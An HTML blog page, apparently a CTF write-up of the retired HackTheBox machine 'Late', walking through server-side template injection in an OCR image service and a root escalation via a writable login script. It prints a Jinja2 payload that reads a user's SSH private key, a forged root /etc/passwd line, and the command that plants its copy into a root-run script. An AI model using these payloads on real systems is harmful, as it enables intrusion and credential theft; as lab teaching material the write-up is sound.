@@ -1,0 +1,256 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This article is a writeup about a retired HacktheBox machine: Late publish on April 23, 2022 by kavigihan. This box is rated as an easy machine. It implies an OCR function, a SSTI and a SUID binary." name="description"/>
+<meta content="security, boot2root, HTB, SSTI, SUID, OCR" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Late" property="og:title"/>
+<meta content="This article is a writeup about a retired HacktheBox machine: Late publish on April 23, 2022 by kavigihan. This box is rated as an easy machine. It implies an OCR function, a SSTI and a SUID binary." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2022/08/htb-late.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2022-08-22 19:00:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="SSTI" property="article:tag"/>
+<meta content="SUID" property="article:tag"/>
+<meta content="OCR" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Late</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
+<p>Offensive security tales</p>
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
+                  About
+                </a>
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
+                  Notes
+                </a>
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
+                  Tools
+                </a>
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
+<article class="single">
+<header>
+<h1 id="htb-late">HTB: Late</h1>
+<p>
+      Posted on 22 Aug 2022 in <a href="../../category/security.html">security</a>
+
+        • 3 min read
+    </p>
+</header>
+<div>
+<p><img alt="Late Card" class="align-left" src="/media/2022.08/late_card.png" width="262"/></p>
+<p>This article is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.com/home/machines/profile/463">Late</a> publish on
+April 23, 2022 by
+<a href="https://www.hackthebox.com/home/users/profile/389926">kavigihan</a>.
+This box is rated as an easy machine. It implies an OCR function, a SSTI and a SUID binary.</p>
+<h1>Foothold and user</h1>
+<h2>Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are open.</p>
+<div class="highlight"><pre><span></span><code># Nmap 7.92 scan initiated Sun Jun 12 08:22:12 2022 as: nmap -sSV -oN notes.md 10.129.72.242
+Nmap scan report for 10.129.72.242
+Host is up (0.017s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmp.org/submit/ .
+# Nmap done at Sun Jun 12 08:22:19 2022 -- 1 IP address (1 host up) scanned in 7.13 seconds
+</code></pre></div>
+<p>Port 80 was a web application containing a link to a subdomain 
+<code>http://images.late.htb/</code>. This application allowed to perform OCR on images.
+We test a few example and realize that we are facing <a href="https://portswigger.net/web-security/server-side-template-injection">SSTI</a>.</p>
+<p>We upload an image containing the basic SSTI identification:</p>
+<p><img alt="SSTI identification" src="/media/2022.08/late_01.png"/></p>
+<p>The application resolved the second operation.</p>
+<div class="highlight"><pre><span></span><code>&lt;p&gt;${8*8} aa 49
+&lt;/p&gt;
+</code></pre></div>
+<p>Following PortSwigger graph I uploaded a new image.</p>
+<p><img alt="SSTI identification 2" src="/media/2022.08/late_02.png"/></p>
+<p>The application resolved <code>7*'7'</code> as <code>7777777</code>. Therefore the application was using Jinja2.</p>
+<p>A <a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">blog post</a> described Jinja injection.</p>
+<p>I verified that <code>popen</code> is available:</p>
+<p><img alt="checking popen" src="/media/2022.08/late_03.png"/></p>
+<p>Then by dichotomy I founded the <code>popen</code> index.</p>
+<p><img alt="popen index" src="/media/2022.08/late_04.png"/></p>
+<p><code>Popen</code> was the subprocess with index 249.</p>
+<div class="highlight"><pre><span></span><code>&lt;p&gt;[&amp;lt;class &amp;#39;zipfile.ZipFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.CompletedProcess&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.Popen&amp;#39;&amp;gt;]
+&lt;/p&gt;
+</code></pre></div>
+<p>I ran <code>ls</code> to proved that I had RCE.</p>
+<p><img alt="running ls" src="/media/2022.08/late_05.png"/></p>
+<div class="highlight"><pre><span></span><code>&lt;p&gt;(b&amp;#39;main.py\nmisc\n__pycache__\nstatic\ntemplates\nuploads\nwsgi.py\n&amp;#39;, None)
+&lt;/p&gt;
+</code></pre></div>
+<p>I ran <code>id</code> to get an idea of which user was running the application. The user <code>id</code> was 1000 meaning that this
+was probably a standard human user.</p>
+<div class="highlight"><pre><span></span><code>&lt;p&gt;(b&amp;#39;uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n&amp;#39;, None)
+</code></pre></div>
+<p>After a few trials, I found a payload that allowed to retrieve <code>id_rsa</code> from the user.</p>
+<div class="highlight"><pre><span></span><code>{{''.__class__.__mro__[1].__subclasses__()[249](['cat','/home/svc_acc/.ssh/id_rsa'],stdout=-1).communicate()}}
+</code></pre></div>
+<p>I connected to the box using SSH and grabbed the user flag.</p>
+<div class="highlight"><pre><span></span><code>└─$ ssh svc_acc@10.129.72.242 -i id_rsa
+svc_acc@late:~$ id
+uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+svc_acc@late:~$ cat user.txt
+17295259a78e40790974b3ac7d2d0a8f
+</code></pre></div>
+<h1>Root</h1>
+<p>I ran <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a> and found that there was a user writable file in <code>/usr/local/sbin</code>, a folder where binary are run as root.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="nv">RECIPIENT</span><span class="o">=</span><span class="s2">"root@late.htb"</span>
+<span class="nv">SUBJECT</span><span class="o">=</span><span class="s2">"Email from Server Login: SSH Alert"</span>
+
+<span class="nv">BODY</span><span class="o">=</span><span class="s2">"</span>
+<span class="s2">A SSH login was detected.</span>
+
+<span class="s2">        User:        </span><span class="nv">$PAM_USER</span><span class="s2"></span>
+<span class="s2">        User IP Host: </span><span class="nv">$PAM_RHOST</span><span class="s2"></span>
+<span class="s2">        Service:     </span><span class="nv">$PAM_SERVICE</span><span class="s2"></span>
+<span class="s2">        TTY:         </span><span class="nv">$PAM_TTY</span><span class="s2"></span>
+<span class="s2">        Date:        `date`</span>
+<span class="s2">        Server:      `uname -a`</span>
+<span class="s2">"</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="si">${</span><span class="nv">PAM_TYPE</span><span class="si">}</span> <span class="o">=</span> <span class="s2">"open_session"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+        <span class="nb">echo</span> <span class="s2">"Subject:</span><span class="si">${</span><span class="nv">SUBJECT</span><span class="si">}</span><span class="s2"> </span><span class="si">${</span><span class="nv">BODY</span><span class="si">}</span><span class="s2">"</span> <span class="p">|</span> /usr/sbin/sendmail <span class="si">${</span><span class="nv">RECIPIENT</span><span class="si">}</span>
+<span class="k">fi</span>
+</code></pre></div>
+<p>I copied <code>/etc/passwd</code> and added a new line containing a root user (<code>id=0</code>) with the password <code>pass123</code>:
+<code>toto2:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</code></p>
+<p>Then I modified the <code>/usr/local/sbin/ssh-alert.sh</code> file to copy the modified <code>passwd</code> file in <code>etc</code>:
+<code>echo 'cp /home/svc_acc/passwd /etc/passwd' &gt;&gt;/usr/local/sbin/ssh-alert.sh</code></p>
+<p>Then I connect to ssh with our <code>svc_acc</code> user and switch user to <code>toto2</code> and grabbed the flag.</p>
+<div class="highlight"><pre><span></span><code>svc_acc@late:~$ su toto2
+root@late:/home/svc_acc# id
+uid=0(root) gid=0(root) groups=0(root)
+root@late:/home/svc_acc# cd
+root@late:~# cat root.txt
+365276e9d7ba2bb0c907fe9ee608164a
+</code></pre></div>
+<h1>Wrapping up</h1>
+<p>A nice box exploiting SSTI and a SUID binary. The fact that the SSTI was in an image was
+fun but tedious as sometime the OCR was not perfect and submitting the same image another
+time did not give the same result.</p>
+</div>
+<div class="tag-cloud">
+<p>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/ssti.html">SSTI</a>
+<a href="../../tag/suid.html">SUID</a>
+<a href="../../tag/ocr.html">OCR</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2022/08/htb-timelaps.html" title="HTB: Timelaps">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
+</p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
+</p><p>
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " maggick's logs ",
+  "url" : "../..",
+  "image": "https://maggick.fr/media/image.png",
+  "description": ""
+}
+</script>
+</body>
+</html>
